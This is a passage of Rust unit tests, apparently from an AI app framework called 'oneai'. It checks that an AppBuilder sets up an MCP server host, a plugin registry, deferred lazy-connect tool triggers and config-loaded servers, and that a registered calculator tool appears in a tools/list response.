            .expect("Build should succeed");

        // Platform should be Android (set by the adapter)
        assert_eq!(*app.platform(), Platform::Android);
    }

    #[tokio::test]
    async fn test_app_with_mcp_server_host() {
        let app = AppBuilder::new()
            .noop_interaction_gate()
            .mcp_server_host() // ← enable MCP server hosting
            .build()
            .await
            .expect("Build should succeed");

        // MCP server host should be created
        assert!(app.mcp_server_host().is_some());
        assert_eq!(app.mcp_server_host().unwrap().server_info().name, "oneai");

        // No MCP plugin registry (not configured)
        assert!(app.mcp_plugin_registry().is_none());
    }

    #[tokio::test]
    async fn test_app_with_mcp_plugin_registry() {
        let registry = oneai_mcp::McpPluginRegistry::new();
        let app = AppBuilder::new()
            .noop_interaction_gate()
            .mcp_plugin_registry(registry) // ← set MCP plugin registry
            .build()
            .await
            .expect("Build should succeed");

        // MCP plugin registry should be set
        assert!(app.mcp_plugin_registry().is_some());

        // No MCP server host (not enabled)
        assert!(app.mcp_server_host().is_none());
    }

    #[tokio::test]
    async fn test_app_with_mcp_lazy_server_registers_connect_trigger() {
        // A `lazy: true` enabled server is skipped at startup and gets a
        // `Deferred` `mcp_connect_<server>` trigger registered so the model
        // can connect it on demand via `tool_search`.
        use std::collections::HashMap;
        let mut registry = oneai_mcp::McpPluginRegistry::new();
        registry.add_entry(oneai_mcp::McpPluginEntry {
            name: "lazyfs".to_string(),
            description: "lazy filesystem".to_string(),
            source: oneai_mcp::McpPluginSource::Stdio {
                command: "echo".to_string(), // never actually connected at build
                args: vec![],
                env: HashMap::new(),
            },
            enabled: true,
            lazy: true,
            ..Default::default()
        });
        let app = AppBuilder::new()
            .noop_interaction_gate()
            .mcp_plugin_registry(registry)
            .build()
            .await
            .expect("Build should succeed");

        // The lazy-connect trigger is registered + Deferred + still available
        // (not yet connected).
        let tool = app
            .tool_registry
            .get("mcp_connect_lazyfs")
            .await
            .expect("mcp_connect_lazyfs trigger registered");
        assert_eq!(tool.exposure(), oneai_core::ToolExposure::Deferred);
        assert!(tool.service_available());
        // The real tool (not connected) is NOT in the registry.
        assert!(app
            .tool_registry
            .get("mcp__lazyfs__read_file")
            .await
            .is_none());
    }

    #[tokio::test]
    async fn test_app_with_mcp_servers_from_config() {
        let app = AppBuilder::new()
            .noop_interaction_gate()
            .mcp_servers_from_config() // ← load MCP servers from config file
            .build()
            .await
            .expect("Build should succeed");

        // MCP plugin registry should be set (from config file)
        assert!(app.mcp_plugin_registry().is_some());

        // Should have builtin entries loaded
        let entries = app.mcp_plugin_registry().unwrap().list_entries();
        assert!(entries.len() >= 2); // filesystem + web_search builtins
    }

    #[tokio::test]
    async fn test_app_with_mcp_and_tools() {
        let app = AppBuilder::new()
            .noop_interaction_gate()
            .mcp_server_host()
            .build()
            .await
            .expect("Build should succeed");

        app.register_tool(Arc::new(CalculatorTool::new()))
            .await
            .unwrap();

        // Verify the MCP server host has the tool
        let host = app.mcp_server_host().unwrap();
        let response = host
            .process_message(serde_json::json!({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/list",
                "params": {}
            }))
            .await;

        let result = response.get("result").unwrap();
        let tools = result.get("tools").unwrap().as_array().unwrap();
        assert!(tools
            .iter()
            .any(|t| t.get("name").and_then(|n| n.as_str()) == Some("calculator")));
    }
}
